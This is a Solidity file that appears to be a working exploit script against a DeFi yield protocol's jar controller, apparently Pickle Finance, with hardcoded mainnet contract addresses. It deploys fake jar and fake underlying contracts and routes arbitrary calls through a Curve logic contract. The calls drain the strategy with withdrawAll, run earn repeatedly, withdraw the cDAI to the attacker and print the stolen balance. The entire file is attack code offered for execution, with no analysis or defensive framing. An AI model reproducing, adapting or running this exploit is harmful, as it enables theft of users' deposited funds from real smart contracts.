import "./scripts/script.sol";

pragma solidity 0.5.17;
pragma experimental ABIEncoderV2;

contract ControllerLike {
    function swapExactJarForJar(
        address _fromJar, // From which Jar
        address _toJar, // To which Jar
        uint256 _fromJarAmount, // How much jar tokens to swap
        uint256 _toJarMinAmount, // How much jar tokens you'd like at a minimum
        address[] calldata _targets,
        bytes[] calldata _data
    ) external;
}

contract CurveLogicLike {
    function add_liquidity(
        address curve,
        bytes4 curveFunctionSig,
        uint256 curvePoolSize,
        uint256 curveUnderlyingIndex,
        address underlying
    ) public;
}

contract FakeJar {
    ERC20Like _token;
    
    constructor(ERC20Like token) public {
        _token = token;
    }
    
    function token() public view returns (ERC20Like) {
        return _token;
    }
    
    function transfer(address to, uint amnt) public returns (bool) {
        return true;
    }
    
    function transferFrom(address, address, uint) public returns (bool) {
        return true;
    }
    
    function getRatio() public returns (uint) {
        return 0;
    }
    
    function decimals() public returns (uint) {
        return 0;
    }
    
    function balanceOf(address) public returns (uint) {
        return 0;
    }
    
    function approve(address, uint) public returns (bool) {
        return true;
    }
    
    function deposit(uint amount) public {
        _token.transferFrom(msg.sender, tx.origin, amount);
    }
    
    function withdraw(uint) public {
    }
}

contract FakeUnderlying {
    address private target;
    
    constructor(address _target) public {
        target = _target;
    }
    
    function balanceOf(address) public returns (address) {
        return target;
    }
    
    function approve(address, uint) public returns (bool) {
        return true;
    }
    
    function allowance(address, address) public returns (uint) {
        return 0;
    }
}

contract JarLike {
    function earn() public;
}

contract Exploit is script {
    function run() public {
        run(this.exploit);
    }
    
    ControllerLike private constant CONTROLLER = ControllerLike(0x6847259b2B3A4c17e7c43C54409810aF48bA5210);
    CurveLogicLike private constant CURVE_LOGIC = CurveLogicLike(0x6186E99D9CFb05E1Fdf1b442178806E81da21dD8);
    
    ERC20Like private constant DAI = ERC20Like(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    ERC20Like private constant CDAI = ERC20Like(0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643);
    
    JarLike private constant PDAI = JarLike(0x6949Bb624E8e8A90F87cD2058139fcd77D2F3F87);
    address private constant STRAT = 0xCd892a97951d46615484359355e3Ed88131f829D;
    
    function arbitraryCall(address to, string memory sig) internal returns (bytes memory) {
        return abi.encodeWithSelector(
            CURVE_LOGIC.add_liquidity.selector,
            to,
            bytes4(keccak256(bytes(sig))),
            1,
            0,
            address(CDAI)
        );
    }
    
    function arbitraryCall(address to, string memory sig, address param) internal returns (bytes memory) {
        return abi.encodeWithSelector(
            CURVE_LOGIC.add_liquidity.selector,
            to,
            bytes4(keccak256(bytes(sig))),
            1,
            0,
            new FakeUnderlying(param)
        );
    }
    
    function exploit() external {
        uint earns = 5;
        
        address[] memory targets = new address[](earns + 2);
        bytes[] memory datas = new bytes[](earns + 2);
        for (uint i = 0; i < earns + 2; i++) {
            targets[i] = address(CURVE_LOGIC);
        }
        datas[0] = arbitraryCall(STRAT, "withdrawAll()");
        for (uint i = 0; i < earns; i++) {
            datas[i + 1] = arbitraryCall(address(PDAI), "earn()");
        }
        datas[earns + 1] = arbitraryCall(STRAT, "withdraw(address)", address(CDAI));
        
        CONTROLLER.swapExactJarForJar(
            address(new FakeJar(CDAI)),
            address(new FakeJar(CDAI)),
            0,
            0,
            targets,
            datas
        );
        
        fmt.printf("cdai=%.8u\n", abi.encode(CDAI.balanceOf(address(this))));
    }
}
